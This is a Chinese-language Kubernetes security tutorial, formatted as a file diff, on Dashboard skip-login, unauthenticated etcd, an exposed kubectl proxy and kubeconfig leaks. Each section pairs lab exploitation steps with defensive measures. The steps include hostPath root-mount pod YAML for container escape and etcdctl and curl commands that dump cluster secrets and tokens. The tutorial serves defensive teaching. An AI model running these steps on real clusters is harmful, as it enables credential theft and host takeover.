@@ -1,0 +1,264 @@
+引言
+
+Kubernetes（简称 K8s）作为云原生时代的操作系统，已经成为容器编排的事实标准。然而，随着 K8s 集群的广泛部署，其自身的安全配置问题也日益凸显。在云上攻防演练中，攻击者往往将目光瞄准 K8s 的薄弱环节，通过未授权访问、配置不当等手段获取集群控制权，进而渗透至整个云环境。本文聚焦于 K8s 容器安全的四个高风险攻击面：Dashboard 未授权访问、etcd 未授权访问、Proxy 不安全配置以及Config 文件泄露。我们将深入剖析每个漏洞的原理，通过实战复现展示攻击路径，并提供相应的防御措施，帮助安全从业者更好地理解和防范此类风险。
+
+1. Kubernetes API 访问控制基础
+
+在深入具体漏洞之前，有必要简要了解 K8s 的访问控制机制。K8s API Server 是所有管理操作的入口，其请求流程通常经过：认证（Authentication）→ 授权（Authorization）→ 准入控制（Admission Control）。默认情况下，API Server 提供 HTTPS 安全端口（6443）并启用证书认证，同时可配置匿名访问、Token、OIDC 等多种认证方式。而本文涉及的风险，本质上都是绕过或获得了这些控制机制，从而直接与 API Server 或存储后端（etcd）交互。
+
+2. Dashboard 未授权访问
+
+2.1 漏洞原理
+
+Kubernetes Dashboard 是一个基于 Web 的通用管理界面，用于管理和监控集群。默认情况下，Dashboard 需要用户通过 kubeconfig 文件或 Token 登录。然而，两种常见配置错误会导致未授权访问：
+
+· HTTP 接口暴露：Dashboard 默认监听 8001 端口并提供 HTTPS 服务，但如果运维人员将未加密的 HTTP 接口暴露到公网（例如通过 Service 或 Ingress），攻击者可直接访问。
+· 跳过登录功能开启：Dashboard 启动时若设置 --enable-skip-login 参数，登录页面会出现“Skip”按钮，点击即可跳过认证进入管理界面。此外，如果 Dashboard 绑定了 cluster-admin 集群角色，则拥有整个集群的最高管理权限。
+
+2.2 攻击场景
+
+攻击者通过扫描或信息收集发现暴露的 Dashboard 页面，点击“Skip”进入控制台。随后，攻击者可以创建或上传一个恶意 Pod，该 Pod 将宿主机的根目录挂载到容器内，从而获得宿主机文件系统的访问权限。利用该权限，攻击者可以窃取节点上的敏感信息（如云服务商凭证、SSH 密钥）或直接实现容器逃逸，控制宿主机。
+
+2.3 复现利用
+
+环境搭建（参考安装指南）：
+
+```bash
+# 部署 Dashboard
+kubectl create -f recommended.yaml
+
+# 查看 Dashboard 运行状态
+kubectl get pod,svc -n kubernetes-dashboard
+
+# 修改 Service 为 NodePort 或 LoadBalancer 暴露到公网（模拟配置不当）
+kubectl edit svc kubernetes-dashboard -n kubernetes-dashboard
+# 将 type 改为 NodePort，并记录暴露的端口
+```
+
+利用步骤：
+
+1. 访问暴露的 Dashboard 页面，点击“Skip”登录。
+2. 在 Dashboard 界面中，选择“创建资源”，使用以下 YAML 定义一个挂载宿主机根目录的 Pod：
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker-pod
+spec:
+  containers:
+  - image: nginx
+    name: attacker-container
+    volumeMounts:
+    - mountPath: /mnt
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+```
+
+1. 应用 YAML 后，通过 Dashboard 的 Pod 列表进入该 Pod 的终端（或使用 kubectl exec）。
+2. 在容器内，可以访问 /mnt 目录，即宿主机的根文件系统，从而读取敏感文件或写入 SSH 公钥实现持久化。
+
+2.4 防御措施
+
+· 禁止将 Dashboard 暴露到公网：确保 Dashboard 仅在内网可访问，并使用 Ingress 配合认证代理。
+· 禁用跳过登录功能：切勿设置 --enable-skip-login 参数，始终要求强认证。
+· 最小权限原则：Dashboard 默认使用 kubernetes-dashboard 服务账号，应仅授予必要的 RBAC 权限，避免绑定 cluster-admin。
+· 网络策略：使用 NetworkPolicy 限制对 Dashboard 的访问来源。
+· 审计日志：监控 Dashboard 的访问日志，发现异常跳过登录行为。
+
+3. etcd 未授权访问
+
+3.1 漏洞原理
+
+etcd 是 K8s 集群的后端存储，保存了所有资源对象（包括 Secrets、ConfigMaps、Token 等）的持久化数据。etcd 默认监听 2379 端口，并支持客户端证书认证（--client-cert-auth）。未授权访问的出现通常有以下三种情况：
+
+· 完全未认证：启动 etcd 时未指定 --client-cert-auth 参数，且监听地址设为 0.0.0.0，导致任何人可通过 HTTP API 访问。
+· 本地监听绕过：即使启用了客户端证书认证，etcd 默认监听 127.0.0.1:2379，本地进程可无需证书访问。若攻击者通过 SSRF 或 WebShell 获得了节点的本地网络访问权限，便可绕过认证。
+· 配置不当暴露公网：运维人员可能将 etcd 端口直接暴露到公网，即便启用了证书，若私钥泄露或证书配置错误，也可能导致风险。
+
+3.2 攻击场景
+
+攻击者发现开放的 etcd 端口（直接公网可达或通过 SSRF 本地访问），利用 etcd API 读取所有键值数据，提取出 Kubernetes 的 Secrets（如 Service Account Token）。随后，使用该 Token 向 API Server 发起请求，从而完全接管集群。
+
+3.3 复现利用
+
+环境搭建（参考安装指南）：
+
+修改 /etc/kubernetes/manifests/etcd.yaml，将监听地址改为 0.0.0.0 并重启 kubelet：
+
+```bash
+# 修改 etcd.yaml 中的 --listen-client-urls 和 --advertise-client-urls 为 http://0.0.0.0:2379
+# 并注释掉 --cert-file、--key-file、--client-cert-auth 等相关参数（模拟未认证）
+systemctl restart kubelet.service
+```
+
+利用 V3 API 获取 Secrets：
+
+安装 etcdctl（下载地址）：
+
+```bash
+./etcdctl --endpoints=192.168.139.136:2379 get / --prefix --keys-only | grep /secrets/
+```
+
+读取具体的 Secret（如 Service Account Token）：
+
+```bash
+./etcdctl --endpoints=192.168.139.136:2379 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-xxxxx
+```
+
+得到 Token 后，使用 kubectl 访问 API Server：
+
+```bash
+kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443/ --token="eyJhbGciOiJSUzI1..." -n kube-system get pods
+```
+
+利用 V2 API（etcd v2 版本）：
+
+```bash
+curl http://192.168.139.136:2379/v2/keys/?recursive=true
+```
+
+即可查看所有键值，其中包含 Secrets 等敏感数据。
+
+3.4 防御措施
+
+· 启用客户端证书认证：必须设置 --client-cert-auth=true，并配置 --cert-file、--key-file、--trusted-ca-file。
+· 限制监听地址：etcd 应仅监听内网地址或本地地址（127.0.0.1），并通过防火墙策略限制来源 IP。
+· 网络隔离：将 etcd 置于独立的私有网络，禁止公网访问。
+· 最小化访问权限：对 etcd 的访问使用 TLS 双向认证，并严格管理证书。
+· 定期审计：监控 etcd 的访问日志，及时发现异常查询。
+
+4. Proxy 不安全配置
+
+4.1 漏洞原理
+
+kubectl proxy 命令可以在本地启动一个代理服务器，将请求转发到 Kubernetes API Server，并自动处理认证。该命令通常用于本地调试。当运维人员为了临时暴露 API 到外部，错误地使用以下参数启动代理时，将导致严重风险：
+
+```bash
+kubectl proxy --accept-hosts='^.*$' --address='0.0.0.0' --port=8009
+```
+
+· --address=0.0.0.0 使代理监听所有网络接口，包括公网。
+· --accept-hosts='^.*$' 允许任意 Host 头访问，相当于关闭了主机名验证。
+
+此时，任何能够访问该 IP 和端口的人都可以直接通过代理调用 API Server 的所有接口，无需额外认证（因为代理本身已携带了 kubectl 的凭证）。
+
+4.2 攻击场景
+
+攻击者扫描到开放 8009 端口且返回 Kubernetes API 响应的主机，直接使用 kubectl 命令操作集群：
+
+```bash
+kubectl -s http://<公网IP>:8009 get pods -n kube-system
+```
+
+由于代理继承了启动者的权限，攻击者完全控制了集群。
+
+4.3 复现利用
+
+环境搭建：
+
+```bash
+# 在具有集群管理权限的机器上启动不安全的 proxy
+kubectl --insecure-skip-tls-verify proxy --accept-hosts='^.*$' --address='0.0.0.0' --port=8009
+```
+
+利用：
+
+```bash
+# 攻击者机器
+kubectl -s http://<目标IP>:8009 get nodes
+```
+
+4.4 防御措施
+
+· 禁止将 proxy 暴露到公网：kubectl proxy 仅用于本地调试，默认监听 127.0.0.1，切勿修改监听地址。
+· 如需远程访问 API，应使用认证代理：如 Kubernetes 的 API Server 本身就支持 HTTPS 和认证，直接暴露 API Server 并严格配置防火墙和认证。
+· 使用端口白名单：在主机层面配置防火墙，仅允许特定 IP 访问 proxy 端口。
+· 监控异常端口：定期检查主机上监听的端口，发现不必要的开放端口立即处理。
+
+5. Config 文件泄露
+
+5.1 漏洞原理
+
+Kubeconfig 文件是 Kubernetes 的配置文件，用于存储集群访问信息，包括 API Server 地址、证书、Token 等凭证。文件默认位于 ~/.kube/config，也可通过环境变量 $KUBECONFIG 或 --kubeconfig 参数指定。一旦该文件泄露，攻击者可直接使用其中凭证连接集群。
+
+泄露途径多种多样：开发者将代码上传至公开 GitHub 仓库时误包含 kubeconfig；员工终端被植入恶意软件；WebShell 读取配置文件等。
+
+5.2 攻击场景
+
+攻击者获得 kubeconfig 文件后，安装 kubectl 并执行命令：
+
+```bash
+kubectl --kubeconfig=config --insecure-skip-tls-verify get nodes
+```
+
+随后，攻击者可以创建恶意 Pod，挂载宿主机路径实现逃逸，与 Dashboard 利用类似。
+
+5.3 复现利用
+
+获取 config 文件（假设已通过某种方式获得）：
+
+```bash
+# 将 config 文件内容保存为文件
+```
+
+使用 config 连接集群：
+
+```bash
+# 查看集群节点
+kubectl --kubeconfig=config --insecure-skip-tls-verify get nodes
+```
+
+创建恶意 Pod（test.yaml）：
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: xiaodisec
+spec:
+  containers:
+  - image: nginx
+    name: xiaodisec
+    volumeMounts:
+    - mountPath: /mnt
+      name: test-volume
+  volumes:
+  - name: test-volume
+    hostPath:
+      path: /
+```
+
+```bash
+kubectl --kubeconfig=config apply -f test.yaml -n default
+kubectl --kubeconfig=config exec -it xiaodisec bash -n default
+```
+
+进入容器后，即可访问 /mnt 下的宿主机文件系统。
+
+5.4 防御措施
+
+· 加密存储 kubeconfig：对敏感配置文件进行加密，或使用密钥管理服务（如 HashiCorp Vault）。
+· 最小权限原则：为不同场景创建独立的服务账号，仅授予必要权限，并定期轮换凭证。
+· 防止代码泄露：在代码仓库中启用敏感信息扫描（如 GitLeaks、TruffleHog），并将 kubeconfig 文件添加到 .gitignore。
+· 使用临时 Token：对于自动化任务，使用短期有效的 Service Account Token 并定期刷新。
+· 网络层限制：在 API Server 层面启用 IP 白名单，限制只有特定来源 IP 可以访问。
+· 审计日志：监控 kubeconfig 的使用情况，发现异常地理位置或时间段的访问立即告警。
+
+6. 总结与建议
+
+本文详细剖析了 Kubernetes 环境中四种常见的高危配置风险：Dashboard 未授权访问、etcd 未授权访问、Proxy 不安全配置以及 Config 文件泄露。这些风险的核心在于对 K8s 组件及凭证的保护不足，导致攻击者能够轻易绕过认证获得集群控制权。通过实战复现，我们看到了从发现入口到最终逃逸的完整攻击链。
+
+为了构建安全的 Kubernetes 环境，建议遵循以下原则：
+
+· 纵深防御：在网络、主机、容器等多个层面部署安全控制，避免单点失效。
+· 最小权限：所有组件和用户仅授予完成工作所需的最小权限，严格避免绑定 cluster-admin 等特权角色。
+· 认证与加密：启用 TLS 双向认证，确保所有通信加密；etcd 必须开启客户端证书认证。
+· 网络隔离：将管理组件（如 API Server、etcd、Dashboard）置于私有网络，并实施严格的防火墙策略。
+· 配置审计：定期扫描集群配置，检查是否存在未授权访问风险；使用安全基准工具（如 kube-bench）进行合规性检查。
+· 日志与监控：收集并分析 API Server、etcd 及审计日志，及时发现异常行为。
+
+云原生安全是一个持续演进的过程，只有深入理解攻击手法，并结合理论与实践，才能有效防御不断变化的威胁。希望本文能为读者在 Kubernetes 安全防护方面提供有价值的参考。
